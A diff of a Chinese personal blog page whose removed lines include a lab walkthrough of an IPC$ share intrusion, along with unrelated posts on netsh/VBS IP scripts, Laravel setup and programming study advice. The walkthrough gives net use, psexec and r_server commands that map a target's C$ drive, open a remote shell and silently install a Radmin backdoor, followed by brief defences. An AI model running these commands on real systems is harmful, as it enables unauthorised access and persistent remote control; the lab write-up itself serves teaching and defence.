-<h1 id="0x02-实验过程"><a href="#0x02-实验过程" class="headerlink" title="0x02 实验过程"></a>0x02 实验过程</h1><h2 id="步骤1"><a href="#步骤1" class="headerlink" title="步骤1"></a>步骤1</h2><p>使用net share命令观察目标靶机IPC$漏洞是否存在</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-2cb00ff3bba63bf2.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="1.png"></p>
-<h2 id="步骤2"><a href="#步骤2" class="headerlink" title="步骤2"></a>步骤2</h2><p>首先ping一下目标靶机，观察网络连通性。</p>
-<p>然后执行 net use <a href="\ip">\ip</a> “密码” /user:”登陆账户”命令建立IPC$连接</p>
-<p>使用 net use z: <a href="\ip\c$">\ip\c$</a> 命令，将目标靶机的C盘映射到本地z盘</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-559986c4c9b9c446.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="2.png"></p>
-<p>完成上述命令后将会在计算机看到网络位置出现了一个新的盘符，实际上目前就可以通过可视化桌面像在本地操作一样拷贝文件。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-cd765e3151f30b13.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="3.png"></p>
-<h3 id="步骤2-5"><a href="#步骤2-5" class="headerlink" title="步骤2.5"></a>步骤2.5</h3><p>如果你想酷一点的话，我们来试试copy指令。将要使用的远程控制软件拷贝到目标靶机的C盘中。执行过程如下：<br><img src="http://upload-images.jianshu.io/upload_images/2303859-449260e298db82de.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="4.png"></p>
-<h2 id="步骤3"><a href="#步骤3" class="headerlink" title="步骤3"></a>步骤3</h2><p>上述命令执行完毕后，我们使用psexec启动目标靶机上的一个shell。</p>
-<p>将路径切换到psexec程序所在路径下 ，执行如下命令：</p>
-<p>psexec.exe <a href="\ip">\ip</a> –u 用户名 –p 密码 cmd.exe</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-979a5aa04d492827.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="5.png"></p>
-<h2 id="步骤4"><a href="#步骤4" class="headerlink" title="步骤4"></a>步骤4</h2><p>接下来我们来安装控制后门并启动运行。</p>
-<p>使用如下指令实现r_server的静默安装：r_server /install /silence</p>
-<p>执行两次net start  r_server来启动后门服务，出现如下所示，即启动成功。</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-724e1622dc8a558d.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="6.png"></p>
-<h2 id="步骤5"><a href="#步骤5" class="headerlink" title="步骤5"></a>步骤5</h2><p>接下来，我们使用radmin来连接目标靶机上运行的r_server</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-2b828dab7f42f2df.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="7.png"></p>
-<p>添加完成后，我们将可以像在本地一样操作目标靶机</p>
-<p><img src="http://upload-images.jianshu.io/upload_images/2303859-df0d43dad232b610.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="8.png"><br><img src="http://upload-images.jianshu.io/upload_images/2303859-eefd851f834b6cda.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="9.png"></p>
-<h1 id="0x03-防御"><a href="#0x03-防御" class="headerlink" title="0x03 防御"></a>0x03 防御</h1><h2 id="1-关闭IPC-默认共享"><a href="#1-关闭IPC-默认共享" class="headerlink" title="1 关闭IPC$默认共享"></a>1 关闭IPC$默认共享</h2><p><img src="http://upload-images.jianshu.io/upload_images/2303859-2e827045ba913855.png?imageMogr2/auto-orient/strip%7CimageView2/2/w/1240" alt="10.png"></p>
-<h2 id="2-关闭IPC-默认共享的依赖服务server"><a href="#2-关闭IPC-默认共享的依赖服务server" class="headerlink" title="2 关闭IPC$默认共享的依赖服务server"></a>2 关闭IPC$默认共享的依赖服务server</h2><p>控制面板/管理工具/服务 找到server 关闭</p>
-<h2 id="3-屏蔽139，445端口"><a href="#3-屏蔽139，445端口" class="headerlink" title="3 屏蔽139，445端口"></a>3 屏蔽139，445端口</h2>
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/03/07/IPC-EXP/" data-id="cjnynvpcx0001yax79xn2nb7l" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/安全/">安全</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-ip-address-config" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/02/27/ip-address-config/" class="article-date">
-  <time datetime="2018-02-27T15:59:25.000Z" itemprop="datePublished">2018-02-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/02/27/ip-address-config/">windows下脚本配置IP地址</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p>带着笔记本有时候在固定的地方工作，需要用到同一个的Ip地址。换个地方换个Ip，又要重新输一遍。</p>
-<p>感觉这个过程很繁琐，因为是window工作环境，一开始想到了vbs脚本。</p>
-<p>无意中发现了强大的netsh命令。。。。</p>
-<p>下面分两个部分，先介绍netsh的基本用法，然后贴段vbs脚本实现自动配置IP地址功能。</p>
-<h4 id="netsh常见用法"><a href="#netsh常见用法" class="headerlink" title="netsh常见用法"></a>netsh常见用法</h4><p>查看网络配置 netsh interface ip show {选项}<br>配置接口IP/网关IP netsh interface ip set address “本地连接” static ip地址 子网掩码 网关<br>配置自动换取IP地址 DNS地址及 wins地址</p>
-<pre><code>netsh interface ip set address &quot;本地连接&quot; dhcp
-netsh interface ip set dns &quot;本地连接&quot; dhcp
-netsh interface ip set wins &quot;本地连接&quot; dhcp
-</code></pre><p>配置静态IP地址 DNS地址 及 wins地址</p>
-<pre><code>netsh interface ip set address &quot;本地连接&quot; static ip地址
-netsh interface ip set dns &quot;本地连接&quot; static 子网掩码
-netsh interface ip set wins &quot;本地连接&quot; static 网关
-</code></pre><p>查看网络配置文件 netsh -c interface dump 使用管道 &gt; 可导出为网络配置文件<br>导入网络配置文件 netsh -f 文件位置 或者 netsh exec 文件位置</p>
-<h4 id="vbs实现配置脚本"><a href="#vbs实现配置脚本" class="headerlink" title="vbs实现配置脚本"></a>vbs实现配置脚本</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div></pre></td><td class="code"><pre><div class="line">strIP = &quot;10.37.7.228&quot;</div><div class="line">strMask = &quot;255.255.255.0&quot;</div><div class="line">strGW = &quot;10.37.7.254&quot;</div><div class="line"></div><div class="line">strComputer = &quot;.&quot;</div><div class="line">Set objWMIService = GetObject(&quot;winmgmts://&quot; &amp; strComputer &amp; &quot;/root/cimv2&quot;)</div><div class="line">Set colNetAdapters = objWMIService.ExecQuery _</div><div class="line">(&quot;Select * from Win32_NetworkAdapterConfiguration where IPEnabled=TRUE&quot;)</div><div class="line"></div><div class="line">strIPAddress = Array(strIP)</div><div class="line">strSubnetMask = Array(strMask)</div><div class="line">strGateway = Array(strGW)</div><div class="line">strGatewayMetric = Array(1)</div><div class="line"></div><div class="line">For Each objNetAdapter in colNetAdapters</div><div class="line">    errEnable = objNetAdapter.EnableStatic(strIPAddress, strSubnetMask)</div><div class="line">    errGateways = objNetAdapter.SetGateways(strGateway, strGatewaymetric)</div><div class="line">    If errEnable = 0 Then</div><div class="line">        WScript.Echo &quot;IP地址已更改。&quot;</div><div class="line">    Else</div><div class="line">        WScript.Echo &quot;更改IP地址失败。&quot;</div><div class="line">    End If</div><div class="line">Next</div></pre></td></tr></table></figure>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/27/ip-address-config/" data-id="cjnynvpe7000cyax78ti456td" class="article-share-link">分享</a>
-      
-      
-      
-  <ul class="article-tag-list"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/工具/">工具</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-laravel-startup" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/02/27/laravel-startup/" class="article-date">
-  <time datetime="2018-02-27T13:35:00.000Z" itemprop="datePublished">2018-02-27</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/02/27/laravel-startup/">laravel项目迁移</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p>最近接触了一个使用larval框架的php项目，虽然有过一些tp5开发的经验，对于环境的认识也还是很不专业，见招拆招了。</p>
-<p>服务器环境是linux系统，项目是从别人的手上半途接过来，因此首要的任务就是熟悉环境，并在本地搭建。</p>
-<h3 id="登陆服务器"><a href="#登陆服务器" class="headerlink" title="登陆服务器"></a>登陆服务器</h3><p>开启vpn，使用个人域名账号登陆跳板机，然后通过跳板机跳转到测试服务器。</p>
-<h3 id="下载相关源代码"><a href="#下载相关源代码" class="headerlink" title="下载相关源代码"></a>下载相关源代码</h3><p>在文件路径下直接使用将项目打包，根据之前的文档了解到可使用sz，rz指令来实现文件的上传下载，具体两个指令使用如何配置在此处不再赘言。</p>
-<h3 id="数据库配置"><a href="#数据库配置" class="headerlink" title="数据库配置"></a>数据库配置</h3><p>根据文档及代码确定mysql数据库所在机器，导出相关数据库并且合理配置。</p>
-<p>过程中发现，数据库ip没有使用配置文件，项目中统共使用了四个不同ip地址上的数据库，具体地址分散于各个文件中，不方便使用，后期可重构解决该问题。</p>
-<h3 id="本地win10环境"><a href="#本地win10环境" class="headerlink" title="本地win10环境"></a>本地win10环境</h3><p>我直接使用的xampp集成工具来配置开发环境。但是将文件下载后发现，无法正常运行。<br>修改了laravel框架下config/app.php中debug模式，发现上一步的打包未曾包含.env等隐藏环境配置文件。</p>
-<p>若要包含隐藏文件，可使用一下两种方式</p>
-<ul>
-<li>tar -rf </li>
-<li>直接打包所有目录</li>
-</ul>
-<h3 id="配置虚拟域名"><a href="#配置虚拟域名" class="headerlink" title="配置虚拟域名"></a>配置虚拟域名</h3><p>至此，项目预览基本没有问题。测试中发现部分链接引用的相对路径出错。因此可以配置xmapp文件，为当前项目开启虚拟路径。<br>具体方式如下<br>修改apace/conf/extra/httpd-vhosts.conf<br>添加如下代码</p>
-<pre><code>&lt;VirtualHost laravel.dev:80&gt;
-    DocumentRoot &quot;D:\xampp\htdocs\laravel\public&quot; 
-    ServerAdmin laravel.dev
-      &lt;Directory &quot;D:\xampp\htdocs\laravel&quot;&gt;
-        Options Indexes FollowSymLinks
-        AllowOverride All
-         Require all granted
-      &lt;/Directory&gt;
-&lt;/VirtualHost&gt;
-</code></pre><p>注意开启nameVirtualHost*:80 这一行。<br>至此，环境搭建完全完成。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/02/27/laravel-startup/" data-id="cjnynvpea000dyax7d1n1tms5" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-learn-program-datastructure" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/20/learn-program-datastructure/" class="article-date">
-  <time datetime="2018-01-20T03:35:00.000Z" itemprop="datePublished">2018-01-20</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/20/learn-program-datastructure/">编程入门路(数据结构+算法)</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <p>之前是在小地方，总觉得自己水平足够了，其实还差的远呢。以前觉得学好C语言毕业的时候就可以呼风唤雨了。想在才觉得，不入流学校的高配还不如大城市的低配。</p>
-<p>之前写了C语言的文章，这个只能说是大一半年的目标。一个学期，能过了语言关，对代码有了悟性，才算是半只脚进了编程的大门了。后面还有很多路要走。</p>
-<p>接下来咱们说说语言熟练之后的路途。</p>
-<p>大神说程序=数据结构+算法。</p>
-<p>那么数据结构有哪些东西，我们需要做到什么程度？如果说C语言能靠40-60道练习题目就学好，数据结构有没有这么一个指标？</p>
-<p>我说一点，就是手写算法。手写算法就是一种刻意练习，计算机的好处就是可以随时动手，不动手只看书，脑子里面就只是模糊的印象。</p>
-<h3 id="数据结构："><a href="#数据结构：" class="headerlink" title="数据结构："></a>数据结构：</h3><ul>
-<li>推荐的还是严蔚敏 吴伟民老师的练习册</li>
-<li>基本的栈，队列。我们现在很少讲怎么去实现栈、队列了。在这里要记住、栈、队列解决问题的几个典型场景，这些场景的算法一定能够不依赖任何资料，完全手写出来。</li>
-<li>树 二叉树（递归）</li>
-<li>图 搜索算法 （最小二叉树的生成，最短路径的生成）</li>
-<li>然后是排序算法 （一定要手写一遍，然后考虑优化）</li>
-</ul>
-<p>上面提到的过一遍，最好的阶段当然是大一下学期这半年的时间，其次就是现在。</p>
-<h3 id="算法"><a href="#算法" class="headerlink" title="算法"></a>算法</h3><ul>
-<li>Master定理 分析推理 复杂形式的算法复杂度</li>
-<li>暴力 （这种思想是大家比较容易接受的）</li>
-<li>分治</li>
-<li>动态规划</li>
-<li>还是算法跟典型使用场景的结合，每种要考虑6-10次典型练习。</li>
-<li>再次强调一点，一定要手写算法。</li>
-</ul>
-<p>做这些，最好的时候是大二上学期，其次是现在。</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/01/20/learn-program-datastructure/" data-id="cjnynvped000gyax7xdvgt50n" class="article-share-link">分享</a>
-      
-      
-      
-    </footer>
-  </div>
-  
-</article>
- 
-
-
-  
-    <article id="post-learning-program-c" class="article article-type-post" itemscope itemprop="blogPost">
-  <div class="article-meta">
-    <a href="/2018/01/16/learning-program-c/" class="article-date">
-  <time datetime="2018-01-16T13:20:05.000Z" itemprop="datePublished">2018-01-16</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2018/01/16/learning-program-c/">编程入门路（C语言）</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <!-- Table of Contents -->
-        
-        <h3 id="面向阅读对象"><a href="#面向阅读对象" class="headerlink" title="面向阅读对象"></a>面向阅读对象</h3><ul>
-<li>刚刚升入大学，开始接触C语言的计算机相关专业新生</li>
-<li>特别感兴趣,想通过编程锻炼思维的C语言学习者</li>
-<li>统而言之，作用一个小白，分享出来，希望提供可以看的见的一条路</li>
-</ul>
-<p><strong>不愿看我絮叨，可以直接拖到文章下方</strong></p>
-<h3 id="我的C语言入门经历"><a href="#我的C语言入门经历" class="headerlink" title="我的C语言入门经历"></a>我的C语言入门经历</h3><h4 id="0x00前言"><a href="#0x00前言" class="headerlink" title="0x00前言"></a>0x00前言</h4><p>距离第一次接触C语言编程，过去很长时间了。这中间陆续学习了很多门语言，零散的写过一些代码，然而水平并不高。在C语言上，我的能力也大概就是能够独立完成课后设计，数据结构相关的题目，二叉树、图等的课后设计，可以使用C或者C++独立实现。后面写的Java Web代码稍多一点。做过的代码行数最多的也就是在linux下实现过一个基于控制台的局域网通信项目。</p>
-<p>在C语言上，因为做过的很多项目都是一些课后作业性质的，缺乏大项目洗礼、锻炼。只能点到为止，希望对于感觉C语言学习有困难有所帮助，并同时期望阅读到本文的新生们能够在大二结束时候达到独立完成各种使用C语言的作业的水平，对于VS等IDE也有较深程度的了解。</p>
-<h4 id="0x01-忘不了的黄昏"><a href="#0x01-忘不了的黄昏" class="headerlink" title="0x01 忘不了的黄昏"></a>0x01 忘不了的黄昏</h4><p>我大学时候使用的教程是钱能的C++教程，一本红皮书。记忆里，那是个带着晴朗空气的九月下午，从学校科技馆提前一节下课，到了信息楼实验室。</p>
-<p>因为没有带课本，就在学校的老机器上凭记忆码着hello world。写完后运行了一下，有几个错误，然后定位到错误修改。再次运行，0 error 0 warning。真是最美的初体验，或许是占了记忆力稍好一点的优势，从hello world中得来了自信心。下机后，拿到课本在读一边关于hello world的介绍，从include开始，到最后的return，一点一点去理解行行代码的实际意思，恍然大悟，编程的感觉很好哇。</p>
-<p>实际上现在是10月份下旬了，大家肯定都学完这个经典的入门程序了。如果要你纸上默写一下这个程序，能不能默写的出来？能不能讲出每一行代码的作用？。这就是第一步，千里之行，始于hello world。Hello world虽小，五脏俱全。关于编程，关于计算机体系，关于API，都在这小小的几行代码了。</p>
-<h4 id="0x02-初窥编程门径"><a href="#0x02-初窥编程门径" class="headerlink" title="0x02 初窥编程门径"></a>0x02 初窥编程门径</h4><p>实际上这个不应该算是第二阶段，算作1.5阶段比较合适。<br>这个节点是怎么样的呢？<br>学完for、while、do while循环，很多人还是写不出代码，觉得看是看的懂了，就是写不出，通病。那我们应该怎么解决？</p>
-<p>我是通过打印第一个平行四边形起家的。想做得出这个没别的办法，先看书上例子。看完例子，做习题，琢磨哪一些是在变化的量，哪一些没有在变化。替换掉那些行数，列数的数字，能够独立成功打印出一个三角形，一个平行四边形，对于循环等结构的具体执行过程也就聊熟于心了。</p>
-<h4 id="0x03-具体知识学习"><a href="#0x03-具体知识学习" class="headerlink" title="0x03 具体知识学习"></a>0x03 具体知识学习</h4><p>实际上过了上一关，编程就没有问题了。剩下的就是学习各种语言相关的细节了，C语言的话，就是字符串、指针、结构体等知识，后面复杂点有位运算、共用体、枚举结构。加上最后的文件操作。有了前面的例子，后面认真听课，完成老师的作业，抄一抄课本上样例代码，就结束了。真的，C语言学起来就应该是如此轻松。因为当独立打印出平行四边形时候，你就已经领悟了编程的本质。</p>
-<h4 id="0x04-练习加强基础"><a href="#0x04-练习加强基础" class="headerlink" title="0x04 练习加强基础"></a>0x04 练习加强基础</h4><p>在我的C语言学习经历中，再新的阶段就是大一的寒假了。寒假在家，也没有笔记本电脑。还是在纸上将书本上的所有代码抄写了一边。</p>
-<p>在接下来大一下学期有时间就刷题目，做完了酷勤C语言100题中的一大半吧！做这些题我零零散散大概用了我半个学期的时间。中间还从学校的图书馆借了一本C语言小游戏百例，都是写猜数字什么的简单游戏。</p>
-<p><a href="http://www.kuqin.com/tiku/20080425/7624.html" target="_blank" rel="external">酷勤C语言百题</a></p>
-<h4 id="0x05-最后"><a href="#0x05-最后" class="headerlink" title="0x05 最后"></a>0x05 最后</h4><p>其实我个人资质是很平庸的，写代码到今天，也没有取得很大的成绩，但是至少在写代码这条道路上找到了一点儿方向感，希望这微薄的话语能够给大家带来一点前行的力量。在开始的时候遇到一些困难是应该的，觉得时间被浪费很多也是必然的，一定要有一个练习的心态。</p>
-<h2 id="简版-数语以敝之"><a href="#简版-数语以敝之" class="headerlink" title="简版-数语以敝之"></a>简版-数语以敝之</h2><h3 id="秘诀"><a href="#秘诀" class="headerlink" title="秘诀"></a>秘诀</h3><p>一本语法书+50道练习题=入门</p>
-<h3 id="达成目标"><a href="#达成目标" class="headerlink" title="达成目标"></a>达成目标</h3><ul>
-<li>独立完成C语言的课程设计，看懂几百行甚至千行内的代码（能力水平判定）</li>
-<li>通过对C语言的学习加强计算机修养（软性）</li>
-</ul>
-<h3 id="简短版-C语言升级打怪之路"><a href="#简短版-C语言升级打怪之路" class="headerlink" title="简短版-C语言升级打怪之路"></a>简短版-C语言升级打怪之路</h3><ul>
-<li>第一关：手写hello world调试运行，理解每一行代码</li>
-<li>第二关：使用顺序、判断、循环三种结构打印规律的复杂图形</li>
-<li>第三关：认真阅读C语言语法书上的其他内容</li>
-<li>第四关：50道题目左右的编程训练</li>
-<li>第五关：独立完成课程的大作业</li>
-</ul>
-<p>—- update—–<br>现在想想，估计的还是过于乐观了。一般进入大学之后，能够很快转换好角色，走完C语言的这个入门阶段，最好是在大一上班学习。要在合适的时候做到合适的事情</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="http://yoursite.com/2018/01/16/learning-program-c/" data-id="cjnynvpep000lyax7wbazp5xr" class="article-share-link">分享</a>
+      <a data-url="http://yoursite.com/2018/03/13/Web-Test/" data-id="cjqenkun100089wx7sav5wy0y" class="article-share-link">Share</a>
       
       
       
@@ -911,7 +795,7 @@ netsh interface ip set wins &quot;本地连接&quot; static 网关
 
 
   <nav id="page-nav">
-    <a class="extend prev" rel="prev" href="/">&laquo; 上一页</a><a class="page-number" href="/">1</a><span class="page-number current">2</span>
+    <a class="extend prev" rel="prev" href="/">&laquo; Prev</a><a class="page-number" href="/">1</a><span class="page-number current">2</span><a class="page-number" href="/page/3/">3</a><a class="extend next" rel="next" href="/page/3/">Next&raquo;</a>
   </nav>
 </section>
            
@@ -929,28 +813,28 @@ netsh interface ip set wins &quot;本地连接&quot; static 网关
   
     
   <div class="widget-wrap">
-    <h3 class="widget-title recent-posts">最新文章</h3>
+    <h3 class="widget-title recent-posts">Recent Posts</h3>
     <div class="widget">
       <ul>
         
           <li>
-            <a href="/2018/10/31/book-list/">book_list</a>
+            <a href="/2019/01/02/mybatis常见sql注入/">mybatis常见sql注入</a>
           </li>
         
           <li>
-            <a href="/2018/10/31/11-python-secuity-fun/">11招玩转网络安全</a>
+            <a href="/2018/11/30/windows系统配置nginx-php/">windows系统配置nginx+php</a>
           </li>
         
           <li>
-            <a href="/2018/10/30/upload-labs/">upload-labs实验</a>
+            <a href="/2018/11/14/zvuldrill靶场/">zvuldrill靶场</a>
           </li>
         
           <li>
-            <a href="/2018/10/28/picture-trojan-and-parsing-vuln/">picture-trojan-and-parsing-vuln</a>
+            <a href="/2018/11/13/shadowsocks-ios-compile/">ios翻墙客户端</a>
           </li>
         
           <li>
-            <a href="/2018/10/28/windows-php-file-upload-1/">windows-php-file-uoload_1</a>
+            <a href="/2018/11/12/shiyanbar-ctf-web/">shiyanbar_ctf_web</a>
           </li>
         
       </ul>
@@ -974,11 +858,11 @@ netsh interface ip set wins &quot;本地连接&quot; static 网关
   
   <div class="outer">
     <div id="footer-left">
-      &copy; 2014 - 2018 Fire Xun&nbsp;|&nbsp;
-      主题 <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
+      &copy; 2014 - 2019 Fire Xun&nbsp;|&nbsp;
+      Theme by <a href="https://github.com/giscafer/hexo-theme-cafe/" target="_blank">Cafe</a>
     </div>
      <div id="footer-right">
-      联系方式&nbsp;|&nbsp;xundidi@gmail.com
+      Contact&nbsp;|&nbsp;xundidi@gmail.com
     </div>
   </div>
 </footer>
